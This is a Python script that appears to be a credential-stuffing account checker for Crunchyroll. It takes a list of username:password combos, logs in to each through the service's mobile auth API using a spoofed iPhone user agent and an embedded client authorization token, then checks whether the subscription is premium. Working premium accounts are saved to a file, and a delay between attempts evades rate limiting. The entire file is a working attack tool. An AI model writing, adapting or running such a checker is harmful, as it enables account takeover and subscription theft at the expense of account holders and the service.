# -*- coding: utf-8 -*-
import requests
import time

def check_crunchyroll_account(username, password):
    device_id = "09313DAA-FD60-476F-BE6C-DCE586A53BB4"
    headers = {
        "Host": "beta-api.crunchyroll.com",
        "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
        "Accept": "*/*",
        "Connection": "keep-alive",
        "ETP-Anonymous-ID": device_id,
        "User-Agent": "Crunchyroll/4.48.1 (bundle_identifier:com.crunchyroll.iphone; build_number:3578348.327156123) iOS/17.4.1 Gravity/4.48.1",
        "Accept-Language": "en-EG;q=1.0, ar-EG;q=0.9",
        "Authorization": "Basic YXJ1ZDEtbnJhdGcxYW94NmRsaGU6TlRDMXFpdGczQ3p1TWVkTnlZZ3BGblk0NzdVTGxacnk=",
        "Accept-Encoding": "gzip;q=1.0, compress;q=0.5"
    }

    data = {
        "device_id": device_id,
        "device_name": "iPhone",
        "device_type": "iPhone 14 Pro",
        "grant_type": "password",
        "password": password,
        "scope": "offline_access",
        "username": username
    }

    try:
        response = requests.post("https://beta-api.crunchyroll.com/auth/v1/token", headers=headers, data=data)
        response.raise_for_status()
    except requests.RequestException as e:
        return {"status": "failure", "message": f"Network error: {e}"}
    
    result = response.json()

    if "access_token" not in result:
        return {"status": "failure", "message": "Failed to obtain access token."}
    
    access_token = result["access_token"]
    headers["Authorization"] = f"Bearer {access_token}"

    try:
        account_info_response = requests.get("https://beta-api.crunchyroll.com/accounts/v1/me", headers=headers)
        account_info_response.raise_for_status()
    except requests.RequestException as e:
        return {"status": "failure", "message": f"Network error: {e}"}

    account_info = account_info_response.json()

    account_id = account_info.get("external_id", "")
    subscription_url = f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{account_id}/benefits"

    try:
        subscription_response = requests.get(subscription_url, headers=headers)
        subscription_response.raise_for_status()
    except requests.RequestException as e:
        return {"status": "failure", "message": f"Network error: {e}"}

    subscription_info = subscription_response.json()

    if "subscription_country" not in subscription_info:
        return {"status": "free", "message": "Free account or no subscription found."}
    
    country_code = subscription_info["subscription_country"]
    # Extract any other relevant details for premium checking
    plan_details = subscription_info.get("subscription_plan_details", "Unknown Plan Details")

    # Define which details indicate premium plans
    premium_indicators = ["Fan Membership", "Mega Fan Membership", "Annual Mega Fan Membership"]

    if any(indicator in plan_details for indicator in premium_indicators):
        country_dict = {
            "AF": "Afghanistan 🇦🇫",
            "AT": "Austria 🇦🇹",
            "AX": "Åland Islands 🇦🇽",
            "AL": "Albania 🇦🇱",
            "DZ": "Algeria 🇩🇿",
            "AS": "American Samoa 🇦🇸",
            "AD": "Andorra 🇦🇩",
            "AO": "Angola 🇦🇴",
            "AI": "Anguilla 🇦🇮",
            "AG": "Antigua and Barbuda 🇦🇬",
            "AR": "Argentina 🇦🇷",
            "AM": "Armenia 🇦🇲",
            "AW": "Aruba 🇦🇼",
            "AU": "Australia 🇦🇺",
            "AZ": "Azerbaijan 🇦🇿",
            "BS": "Bahamas 🇧🇸",
            "BH": "Bahrain 🇧🇭",
            "BD": "Bangladesh 🇧🇩",
            "BB": "Barbados 🇧🇧",
            "BY": "Belarus 🇧🇾",
            "BE": "Belgium 🇧🇪",
            "BZ": "Belize 🇧🇿",
            "BJ": "Benin 🇧🇯",
            "BM": "Bermuda 🇧🇲",
            "BT": "Bhutan 🇧🇹",
            "BO": "Bolivia 🇧🇴",
            "BA": "Bosnia and Herzegovina 🇧🇦",
            "BW": "Botswana 🇧🇼",
            "BR": "Brazil 🇧🇷",
        }

        country_name = country_dict.get(country_code, "Unknown Country")

        return {
            "status": "success",
            "account_id": account_id,
            "subscription_country": country_name,
            "subscription_info": subscription_info
        }
    else:
        return {"status": "free", "message": "Non-premium account."}

def process_accounts(input_path, output_path):
    print(f"Processing file: {input_path}")
    try:
        with open(input_path, 'r', encoding='utf-8') as infile:
            accounts = infile.readlines()
        
        with open(output_path, 'a', encoding='utf-8') as outfile:  # Open in append mode
            for line in accounts:
                if ':' in line:
                    username, password = line.strip().split(':', 1)
                    print(f"Checking account: {username}")
                    result = check_crunchyroll_account(username, password)
                    
                    if result["status"] == "success":
                        valid_info = (f"{username}: Success - Account ID: {result['account_id']}, "
                                      f"Country: {result['subscription_country']}, Info: {result['subscription_info']}")
                        outfile.write(valid_info + "\n")
                        print(f"Valid account found and saved: {valid_info}")
                    
                    # Introduce a delay to avoid rate limiting
                    time.sleep(5)  # Adjust the delay as needed (in seconds)
                
        print(f"Processing complete. Valid accounts saved to {output_path}.")
    
    except FileNotFoundError:
        print(f"Error: The file at {input_path} was not found.")
    except IOError as e:
        print(f"Error reading or writing the file: {e}")

if __name__ == "__main__":
    input_path = input("Enter the path to the accounts file (e.g., /storage/emulated/0/Download/crunchyroll.txt): ")
    output_path = input("Enter the path to save valid accounts (e.g., /storage/emulated/0/Download/valid_accounts.txt): ")
    process_accounts(input_path, output_path)
    
